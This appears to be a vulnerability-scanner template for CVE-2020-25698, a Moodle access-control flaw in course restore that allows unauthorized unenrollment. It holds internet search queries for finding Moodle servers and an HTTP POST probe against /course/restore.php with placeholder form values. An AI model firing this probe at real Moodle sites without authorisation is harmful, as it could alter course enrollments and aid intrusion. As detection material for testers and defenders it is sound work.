id: CVE-2020-25698

info:
  name: Moodle Unauthorized User Unenrollment via Course Restore
  author: ProjectDiscoveryAI
  severity: high
  description: Users' enrollment capabilities were not being sufficiently checked in Moodle when they are restored into an existing course. This could lead to them unenrolling users without having permission to do so.
  impact: |
    An attacker can unenroll users from courses without proper authorization, leading to unauthorized access and potential data loss.
  remediation: |
    Upgrade Moodle to version 3.8.4, 3.7.7, or apply the patch provided by the vendor to mitigate the vulnerability.
  reference:
    - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4NNFCHPPHRJNJROIX6SYMHOC6HMKP3GU/
    - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/B55KXBVAT45MDASJ3EK6VIGQOYGJ4NH6/
    - https://github.com/jev770/badmoodle-scan
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2020-25698
    cwe-id: CWE-284,NVD-CWE-noinfo
    epss-score: 0.00144
    epss-percentile: 0.51634
    cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
  metadata:
    vendor: moodle
    product: moodle
    shodan-query: title:"Moodle"
    fofa-query:
      - body="moodle"
      - title="installation moodle"
      - title="moodle"
    google-query:
      - intitle:"installation moodle"
      - intitle:"moodle"

http:
  - method: POST
    path:
      - "{{BaseURL}}/course/restore.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      courseid=123&file=backupfile.zip&enrolusers=0
    matchers:
      - type: word
        words:
          - "The course has been restored successfully."
        part: body
